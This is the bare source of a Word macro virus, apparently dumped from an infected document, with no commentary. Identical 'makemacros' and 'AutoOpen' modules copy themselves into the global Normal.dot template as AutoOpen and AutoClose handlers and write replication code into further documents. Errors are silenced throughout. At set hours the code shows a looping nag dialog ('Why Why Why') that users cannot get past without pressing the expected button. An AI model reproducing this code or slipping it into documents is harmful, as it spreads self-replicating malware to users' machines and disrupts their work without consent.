   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "makemacros"

   Public Sub MAIN()
   Dim Count_
   Dim test
   Dim i
   Dim infect
   Dim t$
   Dim rightnow
   Dim buttom
   '***** makemacros *****
   '***** Copy macro to Normal.dot *****
   On Error Resume Next
   Count_ = WordBasic.CountMacros(0)
   test = 0
   For i = 1 To Count_
     If WordBasic.[MacroName$](i, 0) = "makemacros" Then test = 1
   Next i
   If test = 0 Then
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":makemacros", "Normal.dot:makemacros", 1
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":makemacros", "Normal.dot:AutoOpen", 1
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":makemacros", "Normal.dot:AutoClose", 1
      GoTo checktime
   End If

   '***** Copy macro to file *****
   Count_ = WordBasic.CountMacros(1)
   infect = 0
   For i = 1 To Count_
      If WordBasic.[MacroName$](i, 1) = "makemacros" Then infect = 1
   Next i
   If infect = 0 Then
     '***** Create empty macro *****
     WordBasic.ToolsMacro Name:="empty", Edit:=1, Show:=0
     WordBasic.LineDown 1
     '***** Copy macro from normal.dot to new.doc *****
     WordBasic.Insert "FileSaveAs.Format=1"
     WordBasic.InsertPara
     WordBasic.Insert "MacroCopy " + Chr(34) + "Normal.Dot:makemacros" + Chr(34) + ",FileName$()+" + Chr(34) + ":makemacros" + Chr(34)
     WordBasic.InsertPara
     WordBasic.Insert "MacroCopy " + Chr(34) + "Normal.Dot:AutoOpen" + Chr(34) + ",FileName$()+" + Chr(34) + ":AutoOpen" + Chr(34)
     WordBasic.InsertPara
     WordBasic.Insert "FileSaveAll.Format=1"
     WordBasic.InsertPara
     WordBasic.DocClose 1
     WordBasic.Call "empty"
   End If
   WordBasic.ToolsMacro Name:="empty", Delete:=1, Show:=1

   '***** Dialog *****
   checktime:
   Dim dlg As Object
   WordBasic.BeginDialog 374, 218, "Why Why Why"
       WordBasic.Text 72, 27, 183, 17, "Why doesn't pepole work?", "Text1"
       WordBasic.PushButton 91, 65, 152, 21, "No money", "Push1"
       WordBasic.PushButton 91, 93, 150, 21, "No drink", "Push2"
       WordBasic.PushButton 91, 122, 152, 21, "No eat", "Push3"
       WordBasic.PushButton 92, 152, 150, 21, "No instant noodles", "Push4"
       WordBasic.PushButton 91, 181, 150, 21, "No lunch box", "Push5"
   WordBasic.EndDialog
   Set dlg = WordBasic.CurValues.UserDialog

   '***** check answer *****
   While t$ <> "True"
     rightnow = WordBasic.Hour(WordBasic.Now())
     If t$ = "False" Then
        WordBasic.MsgBox "No! No! NO!"
     End If
     t$ = "False"
     Select Case rightnow
       Case 9
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 2 Then t$ = "True"
       Case 12
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 5 Then t$ = "True"
       Case 18
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 4 Then t$ = "True"
       Case 24
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 1 Then t$ = "True"
       Case 17
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 3 Then t$ = "True"
       Case Else
           t$ = "True"
     End Select
   Wend
   If buttom > 0 Then
     WordBasic.MsgBox "Yes, we need."
   End If

   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Count_
   Dim test
   Dim i
   Dim infect
   Dim t$
   Dim rightnow
   Dim buttom
   '***** makemacros *****
   '***** Copy macro to Normal.dot *****
   On Error Resume Next
   Count_ = WordBasic.CountMacros(0)
   test = 0
   For i = 1 To Count_
     If WordBasic.[MacroName$](i, 0) = "makemacros" Then test = 1
   Next i
   If test = 0 Then
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":makemacros", "Normal.dot:makemacros", 1
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":makemacros", "Normal.dot:AutoOpen", 1
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":makemacros", "Normal.dot:AutoClose", 1
      GoTo checktime
   End If

   '***** Copy macro to file *****
   Count_ = WordBasic.CountMacros(1)
   infect = 0
   For i = 1 To Count_
      If WordBasic.[MacroName$](i, 1) = "makemacros" Then infect = 1
   Next i
   If infect = 0 Then
     '***** Create empty macro *****
     WordBasic.ToolsMacro Name:="empty", Edit:=1, Show:=0
     WordBasic.LineDown 1
     '***** Copy macro from normal.dot to new.doc *****
     WordBasic.Insert "FileSaveAs.Format=1"
     WordBasic.InsertPara
     WordBasic.Insert "MacroCopy " + Chr(34) + "Normal.Dot:makemacros" + Chr(34) + ",FileName$()+" + Chr(34) + ":makemacros" + Chr(34)
     WordBasic.InsertPara
     WordBasic.Insert "MacroCopy " + Chr(34) + "Normal.Dot:AutoOpen" + Chr(34) + ",FileName$()+" + Chr(34) + ":AutoOpen" + Chr(34)
     WordBasic.InsertPara
     WordBasic.Insert "FileSaveAll.Format=1"
     WordBasic.InsertPara
     WordBasic.DocClose 1
     WordBasic.Call "empty"
   End If
   WordBasic.ToolsMacro Name:="empty", Delete:=1, Show:=1

   '***** Dialog *****
   checktime:
   Dim dlg As Object
   WordBasic.BeginDialog 374, 218, "Why Why Why"
       WordBasic.Text 72, 27, 183, 17, "Why doesn't pepole work?", "Text1"
       WordBasic.PushButton 91, 65, 152, 21, "No money", "Push1"
       WordBasic.PushButton 91, 93, 150, 21, "No drink", "Push2"
       WordBasic.PushButton 91, 122, 152, 21, "No eat", "Push3"
       WordBasic.PushButton 92, 152, 150, 21, "No instant noodles", "Push4"
       WordBasic.PushButton 91, 181, 150, 21, "No lunch box", "Push5"
   WordBasic.EndDialog
   Set dlg = WordBasic.CurValues.UserDialog

   '***** check answer *****
   While t$ <> "True"
     rightnow = WordBasic.Hour(WordBasic.Now())
     If t$ = "False" Then
        WordBasic.MsgBox "No! No! NO!"
     End If
     t$ = "False"
     Select Case rightnow
       Case 9
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 2 Then t$ = "True"
       Case 12
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 5 Then t$ = "True"
       Case 18
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 4 Then t$ = "True"
       Case 24
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 1 Then t$ = "True"
       Case 17
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 3 Then t$ = "True"
       Case Else
           t$ = "True"
     End Select
   Wend
   If buttom > 0 Then
     WordBasic.MsgBox "Yes, we need."
   End If

   End Sub
